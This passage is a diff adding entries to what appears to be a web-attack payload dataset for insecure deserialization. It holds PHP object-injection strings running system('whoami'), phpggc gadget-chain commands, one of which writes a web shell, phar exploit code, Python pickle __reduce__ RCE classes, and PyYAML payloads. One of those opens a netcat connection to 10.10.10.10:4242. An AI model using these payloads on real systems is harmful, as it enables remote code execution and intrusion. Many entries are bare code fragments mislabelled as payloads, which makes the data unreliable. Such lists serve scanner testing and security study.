+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240868",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "if(isset($this->inject)){",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240869",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "eval($this->inject);",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240870",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "if(isset($_REQUEST['r'])){",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240871",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$var1=unserialize($_REQUEST['r']);",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240872",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "if(is_array($var1)){",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240873",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "echo \"<br/>\".$var1[0].\" - \".$var1[1];",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240874",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "echo \"\"; # nothing happens here",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240875",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "a:2:{i:0;s:4:\"XVWA\";i:1;s:33:\"Xtreme Vulnerable Web Application\";}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240876",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "string(68) \"O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:17:\"system('whoami');\";}\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240877",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$data = unserialize($_COOKIE['auth']);",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240878",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "if ($data['username'] == $adminName && $data['password'] == $adminPassword) {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240879",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$admin = true;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240880",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$admin = false;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240881",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "a:2:{s:8:\"username\";b:1;s:8:\"password\";b:1;}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240882",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "class ObjectExample",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240883",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "var $guess;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240884",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "var $secretCode;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240885",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$obj = unserialize($_GET['input']);",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240886",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "if($obj) {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240887",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$obj->secretCode = rand(500000,999999);",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240888",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "if($obj->guess === $obj->secretCode) {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240889",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "echo \"Win\";",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240890",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "O:13:\"ObjectExample\":2:{s:10:\"secretCode\";N;s:5:\"guess\";R:2;}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240891",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "a:2:{s:10:\"admin_hash\";N;s:4:\"hmac\";R:2;}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240892",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "phpggc monolog/rce1 'phpinfo();' -s",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240893",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "phpggc monolog/rce1 assert 'phpinfo()'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240894",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240895",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240896",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "class PDFGenerator { }",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240897",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$dummy = new PDFGenerator();",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240898",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$dummy->callback = \"passthru\";",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240899",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$dummy->fileName = \"uname -a > pwned\"; //our payload",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240900",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "@unlink(\"poc.phar\");",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240901",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$poc = new Phar(\"poc.phar\");",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240902",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$poc->startBuffering();",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240903",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$poc->setStub(\"<?php echo 'Here is the STUB!'; __HALT_COMPILER();\");",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240904",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$poc[\"file\"] = \"text\";",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240905",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$poc->setMetadata($dummy);",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240906",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$poc->stopBuffering();",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240907",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$phar = new Phar('test.phar');",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240908",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "import cPickle",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240909",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "from base64 import b64encode, b64decode",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240910",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "class User:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240911",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "def __init__(self):",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240912",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "self.username = \"anonymous\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240913",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "self.password = \"anonymous\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240914",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "self.rank     = \"guest\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240915",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "h = User()",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240916",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "auth_token = b64encode(cPickle.dumps(h))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240917",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "print(\"Your Auth Token : {}\").format(auth_token)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240918",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "new_token = raw_input(\"New Auth Token : \")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240919",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "token = cPickle.loads(b64decode(new_token))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240920",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "print \"Welcome {}\".format(token.username)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240921",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "import cPickle, os",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240922",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "class Evil(object):",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240923",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "def __reduce__(self):",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240924",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "return (os.system,(\"whoami\",))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240925",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "e = Evil()",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240926",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "evil_token = b64encode(cPickle.dumps(e))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240927",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "print(\"Your Evil Token : {}\").format(evil_token)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240928",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "import pickle",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240929",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "import base64",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240930",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "class RCE:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240931",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "return eval, (\"__import__('os').system('whoami')\",)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240932",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "pickled = pickle.dumps(RCE())",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240933",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "print(base64.b64encode(pickled).decode())",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240934",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "__import__('os').system('whoami') # Reflected RCE",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240935",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "getattr('', __import__('os').popen('whoami').read()) # Error-Based RCE",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240936",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "1 / (__include__(\"os\").popen(\"id\")._proc.wait() == 0) # Boolean-Based RCE",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240937",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "__include__(\"os\").popen(\"id && sleep 5\").read() # Time-Based RCE",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240938",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "!!python/object/apply:time.sleep [10]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240939",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "!!python/object/apply:builtins.range [1, 10, 1]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240940",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "!!python/object/apply:os.system [\"nc 10.10.10.10 4242\"]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240941",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "!!python/object/apply:os.popen [\"nc 10.10.10.10 4242\"]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240942",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "!!python/object/new:subprocess [[\"ls\",\"-ail\"]]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240943",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "!!python/object/new:subprocess.check_output [[\"ls\",\"-ail\"]]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240944",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "!!python/object/apply:subprocess.Popen",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240945",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "- ls",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240946",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "!!python/object/new:str",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240947",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "state: !!python/tuple",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240948",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "- 'print(getattr(open(\"flag\\x2etxt\"), \"read\")())'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240949",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "- !!python/object/new:Warning",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240950",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "state:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240951",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "update: !!python/name:exec",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240952",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "with open('exploit_unsafeloader.yml') as file:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240953",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "data = yaml.load(file,Loader=yaml.UnsafeLoader)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240954",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
